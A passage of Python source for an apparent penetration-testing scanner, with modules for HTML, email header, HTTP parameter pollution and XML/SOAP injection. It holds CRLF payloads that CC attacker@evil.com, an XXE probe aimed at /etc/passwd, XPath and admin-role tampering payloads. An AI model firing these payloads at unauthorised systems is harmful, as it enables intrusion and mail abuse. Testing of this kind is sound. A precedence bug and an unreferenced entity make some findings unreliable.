                    test_url = url
                    resp = requests.post(url, data={param: payload}, headers=headers, timeout=12, verify=verify)

                body = resp.text
                tag_open = payload[:10]
                if tag_open in body:
                    stream("success", f"HTML injection confirmed: {attack}")
                    findings.append({
                        "title": f"HTML Injection — {attack.replace('_', ' ').title()}",
                        "severity": "medium",
                        "url": test_url,
                        "description": f"HTML injection payload ('{attack}') was reflected unescaped, enabling {attack.replace('_', ' ')}.",
                        "evidence": f"Payload: {payload}\nFound in response: {body[:300]}",
                        "remediation": "HTML-encode all user-controlled output. Apply Content Security Policy.",
                        "cwe_id": "CWE-80",
                    })
                else:
                    stream("info", f"HTML injection ({attack}) not reflected")
            except Exception as e:
                stream("warning", f"Request failed ({attack}): {e}")

        stream("info", f"HTML injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-08] Email Header Injection ────────────────────────────────────────────

class EmailHeaderInjectionModule(BaseModule):
    id = "I-08"
    name = "Email Header Injection"
    category = "injection"
    description = (
        "Test contact forms and email-sending endpoints for header injection via "
        "CR/LF injection in To, CC, BCC, Subject fields."
    )
    risk_level = "medium"
    tags = ["email-injection", "crlf", "smtp", "header-injection"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Form / Email Endpoint",
            field_type="url",
            required=True,
            placeholder="https://example.com/contact",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="POST",
            options=[{"value": "POST", "label": "POST"}, {"value": "GET", "label": "GET"}],
        ),
        FieldSchema(
            key="email_field",
            label="Email / 'From' Field Name",
            field_type="text",
            default="email",
            placeholder="email",
            help_text="The parameter used as the sender address.",
        ),
        FieldSchema(
            key="extra_fields",
            label="Other Required Form Fields",
            field_type="textarea",
            required=False,
            placeholder="name=TestUser\nmessage=Hello",
        ),
        FieldSchema(
            key="attacker_email",
            label="Attacker Email (for CC/BCC payload)",
            field_type="text",
            default="attacker@evil.com",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "POST")
        field = params.get("email_field", "email")
        attacker = params.get("attacker_email", "attacker@evil.com")
        findings = []

        headers = {"User-Agent": "PenTools/EHI"}
        extra = {}
        for line in params.get("extra_fields", "").splitlines():
            if "=" in line:
                k, _, v = line.partition("=")
                extra[k.strip()] = v.strip()

        payloads = [
            (f"victim@example.com\r\nCC:{attacker}",       "CRLF CC inject"),
            (f"victim@example.com\nCC:{attacker}",          "LF CC inject"),
            (f"victim@example.com\r\nBCC:{attacker}",       "CRLF BCC inject"),
            (f"victim@example.com%0d%0aCC:{attacker}",      "URL-encoded CRLF CC"),
            (f"victim@example.com%0aCC:{attacker}",         "URL-encoded LF CC"),
            (f"victim@example.com\r\nSubject: Injected",    "Subject override"),
        ]

        for payload, label in payloads:
            try:
                body = {**extra, field: payload}
                resp = requests.request(method, url, data=body, headers=headers,
                                        timeout=12, verify=verify)
                stream("info", f"{label}: HTTP {resp.status_code}")

                # Hard to detect without receiving email; flag 200 with CRLF as potential
                if resp.status_code == 200 and "\r\n" in payload or "\n" in payload:
                    findings.append({
                        "title": f"Email Header Injection — {label} (Potential)",
                        "severity": "medium",
                        "url": url,
                        "description": (
                            f"The form accepted a CRLF-injected email value in '{field}'. "
                            f"If the server uses this value in a mail header without sanitization, "
                            f"spam/phishing is possible."
                        ),
                        "evidence": f"Payload field: {field}={payload!r}\nHTTP {resp.status_code}",
                        "remediation": (
                            "Validate email format strictly (RFC 5321). "
                            "Strip CRLF characters before interpolating into mail headers."
                        ),
                        "cwe_id": "CWE-93",
                    })
                    break  # Flag once
            except Exception as e:
                stream("warning", f"Request failed ({label}): {e}")

        stream("info", f"Email header injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-09] HTTP Parameter Pollution ─────────────────────────────────────────

class HTTPParameterPollutionModule(BaseModule):
    id = "I-09"
    name = "HTTP Parameter Pollution"
    category = "injection"
    description = (
        "Detect HTTP Parameter Pollution (HPP) by submitting duplicate parameters "
        "and checking which value the server uses — useful for bypassing WAFs and logic flaws."
    )
    risk_level = "medium"
    tags = ["hpp", "parameter-pollution", "waf-bypass", "logic"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/transfer?amount=100",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="GET",
            options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"}],
        ),
        FieldSchema(
            key="parameter",
            label="Parameter to Pollute",
            field_type="text",
            required=True,
            placeholder="amount",
        ),
        FieldSchema(
            key="legit_value",
            label="Legitimate Value",
            field_type="text",
            default="100",
            placeholder="100",
        ),
        FieldSchema(
            key="attacker_value",
            label="Attacker Value",
            field_type="text",
            default="0",
            placeholder="0",
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "GET")
        param = params["parameter"]
        legit = params.get("legit_value", "100")
        attacker = params.get("attacker_value", "0")
        findings = []

        headers = {"User-Agent": "PenTools/HPP"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        # Baseline — single param with legit value
        try:
            import urllib.parse
            # Single legit
            b_resp = requests.request(method, url, params={param: legit} if method == "GET" else None,
                                      data={param: legit} if method == "POST" else None,
                                      headers=headers, timeout=12, verify=verify)
            b_len = len(b_resp.text)
            stream("info", f"Baseline (single legit): HTTP {b_resp.status_code}, {b_len} bytes")
        except Exception as e:
            stream("warning", f"Baseline failed: {e}")
            b_len = None

        # HPP variants
        tests = [
            ("first-wins",  f"{url}?{param}={attacker}&{param}={legit}" if method == "GET" else None,
             {param: [attacker, legit]}),
            ("last-wins",   f"{url}?{param}={legit}&{param}={attacker}" if method == "GET" else None,
             {param: [legit, attacker]}),
        ]

        for label, get_url, post_data in tests:
            try:
                if method == "GET":
                    resp = requests.get(get_url or url, headers=headers, timeout=12, verify=verify)
                else:
                    # Requests handles lists as duplicate params
                    resp = requests.post(url, data=post_data, headers=headers, timeout=12, verify=verify)

                stream("info", f"HPP {label}: HTTP {resp.status_code}, {len(resp.text)} bytes")

                if b_len and abs(len(resp.text) - b_len) > 50:
                    stream("success", f"HPP behavior difference detected: {label}")
                    findings.append({
                        "title": f"HTTP Parameter Pollution — {label}",
                        "severity": "medium",
                        "url": url,
                        "description": (
                            f"Server processed duplicate parameter '{param}' differently ({label}). "
                            f"This could allow WAF bypass or business logic manipulation."
                        ),
                        "evidence": f"Param: {param}\nLegit: {legit}, Attacker: {attacker}\nResponse diff: {abs(len(resp.text) - b_len)} bytes",
                        "remediation": "Reject or normalize duplicate query parameters. Document expected behavior explicitly.",
                        "cwe_id": "CWE-235",
                    })
            except Exception as e:
                stream("warning", f"HPP request failed ({label}): {e}")

        stream("info", f"HPP scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [I-10] XML/SOAP Injection ────────────────────────────────────────────────

class XMLSOAPInjectionModule(BaseModule):
    id = "I-10"
    name = "XML/SOAP Injection"
    category = "injection"
    description = (
        "Test XML/SOAP endpoints for entity injection, XPath extraction, and "
        "parameter tampering in SOAP body/headers."
    )
    risk_level = "high"
    tags = ["xml-injection", "soap", "entity-injection", "xxe"]
    celery_queue = "web_audit_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL / SOAP Endpoint",
            field_type="url",
            required=True,
            placeholder="https://example.com/soap/service",
        ),
        FieldSchema(
            key="soap_action",
            label="SOAP Action Header",
            field_type="text",
            required=False,
            placeholder="urn:example:Login",
            help_text="Value for the SOAPAction HTTP header.",
        ),
        FieldSchema(
            key="xml_body",
            label="Original SOAP/XML Body",
            field_type="json_editor",
            required=True,
            placeholder='<?xml version="1.0"?><soapenv:Envelope>...</soapenv:Envelope>',
            help_text="Paste the valid SOAP request body. Inject FUZZ where you want payloads.",
        ),
        FieldSchema(
            key="attack_types",
            label="Attack Types",
            field_type="checkbox_group",
            default=["entity_inject", "xpath_inject", "param_tamper"],
            options=[
                {"value": "entity_inject", "label": "XML Entity injection (XXE probe)"},
                {"value": "xpath_inject",  "label": "XPath injection via body fields"},
                {"value": "param_tamper",  "label": "Parameter tampering (role/isAdmin)"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        xml_body = params.get("xml_body", "")
        attacks = params.get("attack_types", ["entity_inject"])
        findings = []

        headers: dict[str, str] = {
            "Content-Type": "text/xml; charset=utf-8",
            "User-Agent": "PenTools/XMLi",
        }
        if params.get("soap_action"):
            headers["SOAPAction"] = params["soap_action"]
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        def send_body(body: str, label: str):
            try:
                resp = requests.post(url, data=body.encode(), headers=headers,
                                     timeout=15, verify=verify)
                stream("info", f"{label}: HTTP {resp.status_code}")
                return resp
            except Exception as e:
                stream("warning", f"Request failed ({label}): {e}")
                return None

        _xxe_error_kw = ("root:", "file:", "DOCTYPE", "SYSTEM", "entity", "/etc/passwd",
                         "xmlParseEntityRef", "org.xml", "javax.xml", "SAXParseException")

        if "entity_inject" in attacks:
            xxe_probe = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            )
            injected = xml_body.replace("<?xml version=\"1.0\"?>", xxe_probe, 1)
            if "<?xml" not in xml_body:
                injected = xxe_probe + xml_body
            resp = send_body(injected, "XXE entity")
            if resp:
                body_lower = resp.text.lower()
                if any(k.lower() in body_lower for k in _xxe_error_kw):
                    findings.append({
                        "title": "XML/SOAP — XXE Probe Response",
                        "severity": "high",
                        "url": url,
                        "description": "XML entity injection probe triggered an XML parser response that may indicate XXE vulnerability.",
                        "evidence": f"Probe included DTD entity\nHTTP {resp.status_code}\n{resp.text[:400]}",
                        "remediation": "Disable external entity processing in your XML parser (e.g., FEATURE_EXTERNAL_GENERAL_ENTITIES=false).",
                        "cwe_id": "CWE-611",
                    })

        if "param_tamper" in attacks:
            tamper_payloads = [
                ("<role>admin</role>",           "role=admin inject"),
                ("<isAdmin>true</isAdmin>",       "isAdmin=true inject"),
                ("<userId>1</userId>",            "userId=1 override"),
            ]
            for snippet, label in tamper_payloads:
                injected = xml_body.replace("FUZZ", snippet) if "FUZZ" in xml_body else xml_body + snippet
                resp = send_body(injected, label)
                if resp and resp.status_code == 200:
                    if any(w in resp.text.lower() for w in ("admin", "privilege", "welcome", "success")):
                        findings.append({
                            "title": f"XML/SOAP Parameter Tamper — {label}",
                            "severity": "high",
                            "url": url,
                            "description": f"Injecting '{snippet}' into SOAP body returned a success response.",
                            "evidence": f"Snippet: {snippet}\nHTTP {resp.status_code}\n{resp.text[:300]}",
                            "remediation": "Validate and whitelist all parameters extracted from XML body. Do not rely on client-supplied role fields.",
                            "cwe_id": "CWE-20",
                        })

        if "xpath_inject" in attacks:
            xpath_payloads = [
                ("' or 1=1 or ''='",  "XPath OR-true"),
                ("\" or 1=1 or \"\"=\"", "XPath OR-true double-quote"),
            ]
            for payload, label in xpath_payloads:
                injected = xml_body.replace("FUZZ", payload)
                resp = send_body(injected, label)
                if resp and any(k in resp.text.lower() for k in ("xpath", "invalid", "error", "exception")):
                    findings.append({
                        "title": f"XML/SOAP XPath Injection — {label}",
                        "severity": "high",
                        "url": url,
                        "description": f"XPath injection payload triggered an error or different response in SOAP body.",
                        "evidence": f"Payload: {payload}\n{resp.text[:300]}",
                        "remediation": "Parameterize all XPath expressions. Never build XPath from user input.",
                        "cwe_id": "CWE-91",
                    })

        stream("info", f"XML/SOAP injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}
